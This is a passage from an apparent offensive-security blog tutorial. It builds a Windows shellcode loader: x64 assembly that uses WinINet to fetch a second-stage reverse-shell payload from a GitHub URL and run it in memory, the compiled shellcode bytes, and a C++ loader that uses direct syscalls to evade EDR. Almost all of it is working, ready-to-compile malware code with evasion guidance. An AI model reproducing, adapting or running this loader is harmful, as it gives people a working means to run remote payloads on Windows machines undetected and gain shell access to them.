    mov rcx, rdi                    ; RCX = handle to wininet.dll (first argument)
    xor rax, rax 
    push rax
    mov rax, 0x656C694664616552         ; Load "ReadFile" into RAX
    push rax
    mov rax, 0x74656E7265746E49     ; Load "Internet" into RAX                  
    push rax
    mov rdx, rsp                    ; RDX points to "InternetReadFile" (second argument)
    sub rsp, 0x38
    call rsi                        ; Call GetProcAddress
    add rsp, 0x30
    mov r13, rax                    ; store InternetReadFile    

; Prepare arguments for GetProcAddress to locate InternetCloseHandle
    mov rcx, rdi                    ; RCX = handle to wininet.dll (first argument)
    mov eax, 0x90656C64
    shl eax, 0x8
    shr eax, 0x8
    push rax
    mov rax, 0x6E614865736F6C43         ; Load "CloseHan" into RAX
    push rax
    mov rax, 0x74656E7265746E49     ; Load "Internet" into RAX                  
    push rax
    mov rdx, rsp                    ; RDX points to "InternetCloseHandle" (second argument)
    sub rsp, 0x38
    call rsi              ; Call GetProcAddress
    add rsp, 0x30
    mov r12, rax                    ; store InternetCloseHandle    

; ---- InternetOpenA ----
    xor rdx, rdx
    mov eax, 0x90302E35
    shl eax, 0x8
    shr eax, 0x8
    push rax
    mov rax, 0x2F616C6C697A6F4D
    push rax
    mov rcx, rsp             ; lpszAgent
    mov edx, 1               ; INTERNET_OPEN_TYPE_DIRECT
    xor r8, r8               ; lpszProxy
    xor r9, r9               ; lpszProxyBypass
    mov qword [rsp+0x20], 0  ; dwFlags
    sub rsp, 0x30
    call r15                 ; InternetOpenA
    add rsp, 0x30
    mov rdi, rax                 ; hInternet saved handle

; ---- Allocate memory for the saved file/buffer ----
    mov rcx, 0                    ; LPVOID lpAddress = NULL
    mov rdx, 0x5000               ; SIZE_T dwSize = 20 KB for shellcode
    mov r8d, 0x3000               ; MEM_COMMIT | MEM_RESERVE
    mov r9d, 0x04                 ; PAGE_READWRITE temporarily
    add rsp, 96
    mov rax, [rsp+80]
    mov rsi, rax                  ; save to call again :)
    call rax
    ;sub rsp, 96
    ;sub rsp, 8
    pop r15        ; buffer memory address for downloaded file/shellcode

; --- Allocate memory for the long ass URL because other ways didn't work --- 

    mov rcx, 0                    ; LPVOID lpAddress = NULL
    mov rdx, 0x100               ; SIZE_T dwSize = 100 for URL
    mov r8d, 0x3000               ; MEM_COMMIT | MEM_RESERVE
    mov r9d, 0x04                 ; PAGE_READWRITE temporarily
    mov rax, rsi                  ; save to call again :)
    call rax
    push rax

    mov r9, [rsp+72]              ;rtlmovememory



    pop rsi                      ;memory address for the long GITHUB url
; --- transfer URL to new memory region for easier management ---
    sub rsp, 152
    mov rax, 0x906F6E79642E6765
    shl rax, 0x8
    shr rax, 0x8
    push rax
    mov rax, 0x722F6E69616D2F73
    push rax
    mov rax, 0x646165682F736665
    push rax
    mov rax, 0x722F7761722F7261
    push rax
    mov rax, 0x6461726568747265
    push rax
    mov rax, 0x646E752F6D337473
    push rax
    mov rax, 0x79737433672F6D6F
    push rax
    mov rax, 0x632E627568746967
    push rax
    mov rax, 0x2F2F3a7370747468
    push rax
    mov r8,rsp

;rtlmovememory
    mov rcx, rsi ; address for new memory region
    mov rdx, r8               ; source
    xor r8, r8
    mov r8d, 71                      ; size
    ;call RtlMoveMemory
    call r9

   add rsp, 88

 ; ---- InternetOpenUrlA ----
    mov rcx, rdi                     ; hInternet
    mov rdx, rsi                 ; lpszUrl
    xor r8d, r8d                       ; lpszHeaders
    xor r9d, r9d                       ; dwHeadersLength
    mov dword [rsp+0x20], 0x4000000    ; dwFlags
    mov qword [rsp+0x28],0             ; dwContext
    call r14
    add rsp, 0x28
    push rax                       ; hUrl
    mov rsi, [rsp]                 ; hUrl handle for closing

xor rbx, rbx
read_loop:
    ; ---- InternetReadFile ----
    mov rcx, [rsp]                   ; HINTERNET hUrl
    mov rdx, [r15+rbx]                  ; LPVOID lpBuffer
    mov r8d, 4096                     ; DWORD dwNumberOfBytesToRead
    lea r9, dword [rsp+0x40]               ; LPDWORD lpdwNumberOfBytesRead
    xor rax, rax
    call r13
    test eax, eax                    ; Check if InternetReadFile succeeded
    je read_done
    
    mov ecx, dword [rsp+0x40]        ; Bytes read THIS iteration
    test ecx, ecx                    ; Check if 0 bytes (EOF)
    jz read_done
    
    add rbx, rcx                     ; Accumulate total bytes
    jmp read_loop
    
read_done:
    mov [rsp-0x50], ebx              ; Store total bytes downloaded
; ---- Close handles ----
    mov rcx, rsi ;hUrl
    call r12
    mov rcx, rdi ;hInternet
    call r12

; ---- Allocate memory ----
    mov rcx, 0                    ; LPVOID lpAddress = NULL
    mov rdx, 0x5000               ; SIZE_T dwSize = 20 KB for shellcode
    mov r8d, 0x3000               ; MEM_COMMIT | MEM_RESERVE
    mov r9d, 0x40                 ; PAGE_READWRITE_EXECUTE
    mov rax, [rsp + 22*8]
    call rax
    push rax

; ---- Copy shellcode ----
    ; Normally use memcpy(mem_buffer, chunk, bytesRead) or multiple chunks
    ; Example: single chunk
    pop rcx                      ; destination
    mov rdx, r15                 ; source
    mov r8d,  dword [rsp-0x10]                  ; size
    mov rax, [rsp + 21*8]
    call rax                     ;RtlMoveMemory
    push rax
    ; ---- Create thread ----
   xor rcx, rcx                ; lpThreadAttributes = NULL
   xor rdx, rdx                ; dwStackSize = 0
   pop r8                 ; rsi (example) holds shellcode pointer
   xor r9, r9                  ; lpParameter = NULL
   mov dword [rsp+0x20], 0      ; dwCreationFlags = 0
   mov qword [rsp+0x28], 0      ; lpThreadId = NULL
   mov rax, [rsp+0x88]          ; rax = pointer to CreateThread
   call rax

    ; ---- Wait for shellcode ----
    mov rcx, rax
    mov rdx, 0xFFFFFFFF            ; INFINITE
    mov rbx, [rsp+25*8]
    call rbx
   ; mov rcx, [rel hThread]
   ; call CloseHandle

    ; ---- Free memory ----
   ; mov rcx, [rel mem_buffer]
   ; mov rdx, 0
   ; mov r8d, 0x8000                ; MEM_RELEASE
   ; call VirtualFree

    ; Exit
    xor ecx, ecx
    mov rax, [rsp + 18*8]
    call rax
```

After you've successfully completed coding all of that glorious x64 assembly code, it's time to compile it and get your shellcode.  Go ahead and do that and you should be presented with the following shellcode. Here's how I usually generate shellcode:

```nasm
nasm -fwin64 picshellcode.asm -o picshellcode.o
for i in $(objdump -D picshellcode.o | grep “^ “ | cut -f2); do echo -n “\x$i” ; done
```

Here's what I got.  I formatted mine for a more aesthetically pleasing presentation 😸

```cpp
 unsigned char shellcode[] =
"\x90\x90\x90\x90\x90\x90\x90\x48\x83\xec\x28\x48\x83\xe4\xf0\x48\x31\xc9\x65\x48\x8b\x41\x60\x48\x8b"
"\x40\x18\x48\x8b\x70\x10\x48\x8b\x36\x48\x8b\x36\x48\x8b\x5e\x30\x49\x89\xd8\x8b\x5b\x3c\x4c\x01\xc3"
"\x48\x31\xc9\x66\x81\xc1\xff\x88\x48\xc1\xe9\x08\x8b\x14\x0b\x4c\x01\xc2\x44\x8b\x52\x14\x4d\x31\xdb"
"\x44\x8b\x5a\x20\x4d\x01\xc3\x4d\x89\xdd\x4c\x89\xd1\x67\xe3\x0e\x31\xdb\x41\x8b\x1c\x8b\x4c\x01\xc3"
"\x48\xff\xc9\xeb\x1e\xeb\x7f\xff\xc1\x4d\x31\xdb\x44\x8b\x5a\x1c\x4d\x01\xc3\x45\x8b\x3c\x8b\x4d\x01"
"\xc7\x41\x57\x4d\x89\xeb\xff\xc9\xeb\xd1\x31\xc0\x48\x89\xde\x48\x31\xdb\x8a\x1e\x84\xdb\x74\x0a\xc1"
"\xc0\x05\x31\xd8\x48\xff\xc6\xeb\xf0\x3d\x35\x8d\x77\x80\x74\xc5\x3d\xca\x5a\x15\x4a\x74\xbe\x3d\x78"
"\x95\xb7\x85\x74\xb7\x3d\x33\x8a\x8d\xb6\x74\xb0\x3d\x95\xfe\xde\xc7\x74\xa9\x3d\x1b\x01\xa1\xa4\x74"
"\xa2\x3d\x93\xb6\x36\xe5\x74\x9b\x3d\xa7\x70\xdb\xe3\x74\x94\x3d\xfd\x5a\xfc\xce\x74\x8d\x3d\x64\x71"
"\x27\xd7\x74\x86\xe9\x6e\xff\xff\xff\x48\xb8\x77\x69\x6e\x69\x6e\x65\x74\x90\x48\xc1\xe0\x08\x48\xc1"
"\xe8\x08\x50\x48\x89\xe1\x48\x83\xec\x28\x48\x8b\x44\x24\x50\xff\xd0\x48\x83\xc4\x30\x48\x89\xc7\x48"
"\x89\xf9\x48\xb8\x4f\x70\x65\x6e\x41\x90\x90\x90\x48\xc1\xe0\x18\x48\xc1\xe8\x18\x50\x48\xb8\x49\x6e"
"\x74\x65\x72\x6e\x65\x74\x50\x48\x89\xe2\x48\x83\xec\x30\x48\x8b\x44\x24\x58\x48\x89\xc6\xff\xd0\x48"
"\x83\xc4\x30\x49\x89\xc7\x48\x31\xc0\x50\x48\x89\xf9\x48\xb8\x4f\x70\x65\x6e\x55\x72\x6c\x41\x50\x48"
"\xb8\x49\x6e\x74\x65\x72\x6e\x65\x74\x50\x48\x89\xe2\x48\x83\xec\x38\xff\xd6\x48\x83\xc4\x30\x49\x89"
"\xc6\x48\x89\xf9\x48\x31\xc0\x50\x48\xb8\x52\x65\x61\x64\x46\x69\x6c\x65\x50\x48\xb8\x49\x6e\x74\x65"
"\x72\x6e\x65\x74\x50\x48\x89\xe2\x48\x83\xec\x38\xff\xd6\x48\x83\xc4\x30\x49\x89\xc5\x48\x89\xf9\xb8"
"\x64\x6c\x65\x90\xc1\xe0\x08\xc1\xe8\x08\x50\x48\xb8\x43\x6c\x6f\x73\x65\x48\x61\x6e\x50\x48\xb8\x49"
"\x6e\x74\x65\x72\x6e\x65\x74\x50\x48\x89\xe2\x48\x83\xec\x38\xff\xd6\x48\x83\xc4\x30\x49\x89\xc4\x48"
"\x31\xd2\xb8\x35\x2e\x30\x90\xc1\xe0\x08\xc1\xe8\x08\x50\x48\xb8\x4d\x6f\x7a\x69\x6c\x6c\x61\x2f\x50"
"\x48\x89\xe1\xba\x01\x00\x00\x00\x4d\x31\xc0\x4d\x31\xc9\x48\xc7\x44\x24\x20\x00\x00\x00\x00\x48\x83"
"\xec\x30\x41\xff\xd7\x48\x83\xc4\x30\x48\x89\xc7\xb9\x00\x00\x00\x00\xba\x00\x50\x00\x00\x41\xb8\x00"
"\x30\x00\x00\x41\xb9\x04\x00\x00\x00\x48\x83\xc4\x60\x48\x8b\x44\x24\x50\x48\x89\xc6\xff\xd0\x41\x5f"
"\xb9\x00\x00\x00\x00\xba\x00\x01\x00\x00\x41\xb8\x00\x30\x00\x00\x41\xb9\x04\x00\x00\x00\x48\x89\xf0"
"\xff\xd0\x50\x4c\x8b\x4c\x24\x48\x5e\x48\x81\xec\x98\x00\x00\x00\x48\xb8\x65\x67\x2e\x64\x79\x6e\x6f"
"\x90\x48\xc1\xe0\x08\x48\xc1\xe8\x08\x50\x48\xb8\x73\x2f\x6d\x61\x69\x6e\x2f\x72\x50\x48\xb8\x65\x66"
"\x73\x2f\x68\x65\x61\x64\x50\x48\xb8\x61\x72\x2f\x72\x61\x77\x2f\x72\x50\x48\xb8\x65\x72\x74\x68\x65"
"\x72\x61\x64\x50\x48\xb8\x73\x74\x33\x6d\x2f\x75\x6e\x64\x50\x48\xb8\x6f\x6d\x2f\x67\x33\x74\x73\x79"
"\x50\x48\xb8\x67\x69\x74\x68\x75\x62\x2e\x63\x50\x48\xb8\x68\x74\x74\x70\x73\x3a\x2f\x2f\x50\x49\x89"
"\xe0\x48\x89\xf1\x4c\x89\xc2\x4d\x31\xc0\x41\xb8\x47\x00\x00\x00\x41\xff\xd1\x48\x83\xc4\x58\x48\x89"
"\xf9\x48\x89\xf2\x45\x31\xc0\x45\x31\xc9\xc7\x44\x24\x20\x00\x00\x00\x04\x48\xc7\x44\x24\x28\x00\x00"
"\x00\x00\x41\xff\xd6\x48\x83\xc4\x28\x50\x48\x8b\x34\x24\x48\x8b\x0c\x24\x4c\x89\xfa\x41\xb8\x00\x10"
"\x00\x00\x4c\x8d\x4c\x24\xd0\x48\x31\xc0\x41\xff\xd5\x85\xc0\x74\x11\x83\x7c\x24\xd0\x00\x76\x0a\x8b"
"\x4c\x24\xd0\x89\x4c\x24\xc0\xeb\xd3\x48\x89\xf1\x41\xff\xd4\x48\x89\xf9\x41\xff\xd4\xb9\x00\x00\x00"
"\x00\xba\x00\x50\x00\x00\x41\xb8\x00\x30\x00\x00\x41\xb9\x40\x00\x00\x00\x48\x8b\x84\x24\xb0\x00\x00"
"\x00\xff\xd0\x50\x59\x4c\x89\xfa\x41\xb8\xe8\x03\x00\x00\x48\x8b\x84\x24\xa8\x00\x00\x00\xff\xd0\x50"
"\x48\x31\xc9\x48\x31\xd2\x41\x58\x4d\x31\xc9\xc7\x44\x24\x20\x00\x00\x00\x00\x48\xc7\x44\x24\x28\x00"
"\x00\x00\x00\x48\x8b\x84\x24\x88\x00\x00\x00\xff\xd0\x48\x89\xc1\xba\xff\xff\xff\xff\x48\x8b\x9c\x24"
"\xc8\x00\x00\x00\xff\xd3\x31\xc9\x48\x8b\x84\x24\x90\x00\x00\x00\xff\xd0";
```

This is the de facto shellcode that downloads and executes, funny enough, more shellcode (a reverse shell) LOL.  So yeah, we're loading shellcode that downloads and executes more shellcode haha. Now, let's transfer this to our direct syscall based c++ code to load it up and work some magic!

Using our PIC formatted shellcode with Direct Syscalls
-

Once again, I'm not going to go over a lot of detail here.  This is code that uses the direct syscall method for loading APIs via syscalls.  In short, I load `ntdll` from disk and find the syscall number.  We gather the syscall numbers for the following windows APIs

 - void* cleanNtAllocate = ntdll.GetProcAddress("NtAllocateVirtualMemory");
 - void* cleanNtWrite = ntdll.GetProcAddress("NtWriteVirtualMemory");
 - void* cleanNtCreate = ntdll.GetProcAddress("NtCreateThreadEx");

Here's the portion of code that collects the syscall ID from each API:

> syscall stub contents and address + SyscallID

<img width="1577" height="607" alt="image" src="https://github.com/user-attachments/assets/7431d6fd-b1f5-4abb-bf9d-307e14f32c49" />

> allocating 32 bytes for the stub

<img width="658" height="188" alt="image" src="https://github.com/user-attachments/assets/26ca5102-7343-4feb-bf16-8db7802938a9" />

The entire source code, including the ManualNtdll.h and other cpp files can be found in the link below.

I'm also including the assembly source code in the link as well:

[Assembly Code + Syscall and PIC shellcode loader - Source Code](https://github.com/g3tsyst3m/CodefromBlog/tree/main/2025-8-23-Using%20Direct%20Syscalls%20with%20an%20In-Memory%20PIC%20Shellcode%20Loader)

```cpp
#include <windows.h>
#include <winternl.h>
#include <iostream>
#include "ManualNtdll.h"

// Typedefs for syscalls
typedef NTSTATUS(NTAPI* NtAllocateVirtualMemory_t)(
    HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);

typedef NTSTATUS(NTAPI* NtWriteVirtualMemory_t)(
    HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);

typedef NTSTATUS(NTAPI* NtCreateThreadEx_t)(
    PHANDLE, ACCESS_MASK, PVOID, HANDLE, PVOID, PVOID,
    ULONG, SIZE_T, SIZE_T, SIZE_T, PVOID);

int main() {
    ManualNtdll ntdll;
    if (!ntdll.LoadFromDisk(L"C:\\Windows\\System32\\ntdll.dll")) {
        std::cerr << "[-] Failed to load clean ntdll from disk.\n";
        return -1;
    }

    // Resolve NtAllocateVirtualMemory
    void* cleanNtAllocate = ntdll.GetProcAddress("NtAllocateVirtualMemory");
    void* cleanNtWrite = ntdll.GetProcAddress("NtWriteVirtualMemory");
    void* cleanNtCreate = ntdll.GetProcAddress("NtCreateThreadEx");

    if (!cleanNtAllocate || !cleanNtWrite || !cleanNtCreate) {
        std::cerr << "[-] Failed to find required syscall(s).\n";
        return -1;
    }

    auto pNtAllocate = (NtAllocateVirtualMemory_t)ntdll.ResolveSyscallStub(cleanNtAllocate);
    auto pNtWrite = (NtWriteVirtualMemory_t)ntdll.ResolveSyscallStub(cleanNtWrite);
    auto pNtCreate = (NtCreateThreadEx_t)ntdll.ResolveSyscallStub(cleanNtCreate);

    // shellcode that we custom made which uses the wininet InternetOpen "suite" to download shellcode from github
    unsigned char shellcode[] =
        "\x90\x90\x90\x90\x90\x90\x90\x48\x83\xec\x28\x48\x83\xe4\xf0\x48\x31\xc9\x65\x48\x8b\x41\x60\x48\x8b\x40\x18\x48\x8b\x70\x10\x48\x8b\x36\x48\x8b\x36\x48\x8b\x5e\x30\x49\x89\xd8\x8b\x5b\x3c\x4c\x01\xc3\x48\x31\xc9\x66\x81\xc1\xff\x88\x48\xc1\xe9\x08\x8b\x14\x0b\x4c\x01\xc2\x44\x8b\x52\x14\x4d\x31\xdb\x44\x8b\x5a\x20\x4d\x01\xc3\x4d\x89\xdd\x4c\x89\xd1\x67\xe3\x0e\x31\xdb\x41\x8b\x1c\x8b\x4c\x01\xc3\x48\xff\xc9\xeb\x1e\xeb\x7f\xff\xc1\x4d\x31\xdb\x44\x8b\x5a\x1c\x4d\x01\xc3\x45\x8b\x3c\x8b\x4d\x01\xc7\x41\x57\x4d\x89\xeb\xff\xc9\xeb\xd1\x31\xc0\x48\x89\xde\x48\x31\xdb\x8a\x1e\x84\xdb\x74\x0a\xc1\xc0\x05\x31\xd8\x48\xff\xc6\xeb\xf0\x3d\x35\x8d\x77\x80\x74\xc5\x3d\xca\x5a\x15\x4a\x74\xbe\x3d\x78\x95\xb7\x85\x74\xb7\x3d\x33\x8a\x8d\xb6\x74\xb0\x3d\x95\xfe\xde\xc7\x74\xa9\x3d\x1b\x01\xa1\xa4\x74\xa2\x3d\x93\xb6\x36\xe5\x74\x9b\x3d\xa7\x70\xdb\xe3\x74\x94\x3d\xfd\x5a\xfc\xce\x74\x8d\x3d\x64\x71\x27\xd7\x74\x86\xe9\x6e\xff\xff\xff\x48\xb8\x77\x69\x6e\x69\x6e\x65\x74\x90\x48\xc1\xe0\x08\x48\xc1\xe8\x08\x50\x48\x89\xe1\x48\x83\xec\x28\x48\x8b\x44\x24\x50\xff\xd0\x48\x83\xc4\x30\x48\x89\xc7\x48\x89\xf9\x48\xb8\x4f\x70\x65\x6e\x41\x90\x90\x90\x48\xc1\xe0\x18\x48\xc1\xe8\x18\x50\x48\xb8\x49\x6e\x74\x65\x72\x6e\x65\x74\x50\x48\x89\xe2\x48\x83\xec\x30\x48\x8b\x44\x24\x58\x48\x89\xc6\xff\xd0\x48\x83\xc4\x30\x49\x89\xc7\x48\x31\xc0\x50\x48\x89\xf9\x48\xb8\x4f\x70\x65\x6e\x55\x72\x6c\x41\x50\x48\xb8\x49\x6e\x74\x65\x72\x6e\x65\x74\x50\x48\x89\xe2\x48\x83\xec\x38\xff\xd6\x48\x83\xc4\x30\x49\x89\xc6\x48\x89\xf9\x48\x31\xc0\x50\x48\xb8\x52\x65\x61\x64\x46\x69\x6c\x65\x50\x48\xb8\x49\x6e\x74\x65\x72\x6e\x65\x74\x50\x48\x89\xe2\x48\x83\xec\x38\xff\xd6\x48\x83\xc4\x30\x49\x89\xc5\x48\x89\xf9\xb8\x64\x6c\x65\x90\xc1\xe0\x08\xc1\xe8\x08\x50\x48\xb8\x43\x6c\x6f\x73\x65\x48\x61\x6e\x50\x48\xb8\x49\x6e\x74\x65\x72\x6e\x65\x74\x50\x48\x89\xe2\x48\x83\xec\x38\xff\xd6\x48\x83\xc4\x30\x49\x89\xc4\x48\x31\xd2\xb8\x35\x2e\x30\x90\xc1\xe0\x08\xc1\xe8\x08\x50\x48\xb8\x4d\x6f\x7a\x69\x6c\x6c\x61\x2f\x50\x48\x89\xe1\xba\x01\x00\x00\x00\x4d\x31\xc0\x4d\x31\xc9\x48\xc7\x44\x24\x20\x00\x00\x00\x00\x48\x83\xec\x30\x41\xff\xd7\x48\x83\xc4\x30\x48\x89\xc7\xb9\x00\x00\x00\x00\xba\x00\x50\x00\x00\x41\xb8\x00\x30\x00\x00\x41\xb9\x04\x00\x00\x00\x48\x83\xc4\x60\x48\x8b\x44\x24\x50\x48\x89\xc6\xff\xd0\x41\x5f\xb9\x00\x00\x00\x00\xba\x00\x01\x00\x00\x41\xb8\x00\x30\x00\x00\x41\xb9\x04\x00\x00\x00\x48\x89\xf0\xff\xd0\x50\x4c\x8b\x4c\x24\x48\x5e\x48\x81\xec\x98\x00\x00\x00\x48\xb8\x65\x67\x2e\x64\x79\x6e\x6f\x90\x48\xc1\xe0\x08\x48\xc1\xe8\x08\x50\x48\xb8\x73\x2f\x6d\x61\x69\x6e\x2f\x72\x50\x48\xb8\x65\x66\x73\x2f\x68\x65\x61\x64\x50\x48\xb8\x61\x72\x2f\x72\x61\x77\x2f\x72\x50\x48\xb8\x65\x72\x74\x68\x65\x72\x61\x64\x50\x48\xb8\x73\x74\x33\x6d\x2f\x75\x6e\x64\x50\x48\xb8\x6f\x6d\x2f\x67\x33\x74\x73\x79\x50\x48\xb8\x67\x69\x74\x68\x75\x62\x2e\x63\x50\x48\xb8\x68\x74\x74\x70\x73\x3a\x2f\x2f\x50\x49\x89\xe0\x48\x89\xf1\x4c\x89\xc2\x4d\x31\xc0\x41\xb8\x47\x00\x00\x00\x41\xff\xd1\x48\x83\xc4\x58\x48\x89\xf9\x48\x89\xf2\x45\x31\xc0\x45\x31\xc9\xc7\x44\x24\x20\x00\x00\x00\x04\x48\xc7\x44\x24\x28\x00\x00\x00\x00\x41\xff\xd6\x48\x83\xc4\x28\x50\x48\x8b\x34\x24\x48\x8b\x0c\x24\x4c\x89\xfa\x41\xb8\x00\x10\x00\x00\x4c\x8d\x4c\x24\xd0\x48\x31\xc0\x41\xff\xd5\x85\xc0\x74\x11\x83\x7c\x24\xd0\x00\x76\x0a\x8b\x4c\x24\xd0\x89\x4c\x24\xc0\xeb\xd3\x48\x89\xf1\x41\xff\xd4\x48\x89\xf9\x41\xff\xd4\xb9\x00\x00\x00\x00\xba\x00\x50\x00\x00\x41\xb8\x00\x30\x00\x00\x41\xb9\x40\x00\x00\x00\x48\x8b\x84\x24\xb0\x00\x00\x00\xff\xd0\x50\x59\x4c\x89\xfa\x41\xb8\xe8\x03\x00\x00\x48\x8b\x84\x24\xa8\x00\x00\x00\xff\xd0\x50\x48\x31\xc9\x48\x31\xd2\x41\x58\x4d\x31\xc9\xc7\x44\x24\x20\x00\x00\x00\x00\x48\xc7\x44\x24\x28\x00\x00\x00\x00\x48\x8b\x84\x24\x88\x00\x00\x00\xff\xd0\x48\x89\xc1\xba\xff\xff\xff\xff\x48\x8b\x9c\x24\xc8\x00\x00\x00\xff\xd3\x31\xc9\x48\x8b\x84\x24\x90\x00\x00\x00\xff\xd0";

    PVOID baseAddress = nullptr;
    SIZE_T size = sizeof(shellcode);

    NTSTATUS status = pNtAllocate(GetCurrentProcess(), &baseAddress, 0, &size,
        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (status != 0) {
        std::cerr << "[-] NtAllocateVirtualMemory failed. Error code: 0x" << std::hex << status << "\n";
        return -1;
    }
    std::cout << "[+] Memory allocated at " << baseAddress << "\n";

    SIZE_T bytesWritten = 0;
    status = pNtWrite(GetCurrentProcess(), baseAddress, shellcode, sizeof(shellcode), &bytesWritten);
    if (status != 0) {
        std::cerr << "[-] NtWriteVirtualMemory failed. Error code: 0x" << std::hex << status << "\n";
        return -1;
    }
    std::cout << "[+] Wrote " << bytesWritten << " bytes of shellcode.\n";

    HANDLE hThread = nullptr;
    status = pNtCreate(&hThread, THREAD_ALL_ACCESS, nullptr, GetCurrentProcess(),
        (PVOID)baseAddress, nullptr, FALSE, 0, 0, 0, nullptr);
    if (status != 0) {
        std::cerr << "[-] NtCreateThreadEx failed. Error code: 0x" << std::hex << status << "\n";
        return -1;
    }

    std::cout << "[+] Thread created! Waiting for execution...\n";
    WaitForSingleObject(hThread, INFINITE);

    return 0;
}
```

Compile and run, and you can turn your EDR back on if you want as well 😄   Though no guarantees this will not be detected.  It all depends on a number of factors but I've had some great success with it.  Use responsibly of course.  After you compile and run, you should be greeted with a reverse shell as long as you setup your listener for localhost (127.0.0.1) and port 9001.

<img width="1902" height="1015" alt="image" src="https://github.com/user-attachments/assets/3e37a139-6d82-4b57-9240-68f9067155d3" />

Thanks, and if you enjoyed this stay tuned for the next time when I discuss PE loaders and PE injection techniques!  Looking forward to it.  Also I need to continue working on my shellcode video series.
If you're interested in that please do let me know.  I think it's going to be a lot of fun, entertaining, and informative 😸

***ANY.RUN Results***
-

<img width="1085" height="900" alt="image" src="https://github.com/user-attachments/assets/01be980b-8c20-4fb2-86bf-08f900d3e4fa" />

<img width="1105" height="205" alt="image" src="https://github.com/user-attachments/assets/7c0dacc4-40e2-40a5-bbf9-643cdaa5ea10" />

[Full Sandbox Analysis](https://app.any.run/tasks/8b7d6892-9f0b-494f-bb21-aa92a064ac0a)

<div style="text-align: right;">
Sponsored by:<br>
<img src="https://github.com/user-attachments/assets/111a0bb6-66e1-43b0-9a0a-5ce093f4b65e" alt="Sponsor logo" style="max-width: 200px;">
</div>

See you guys next time!
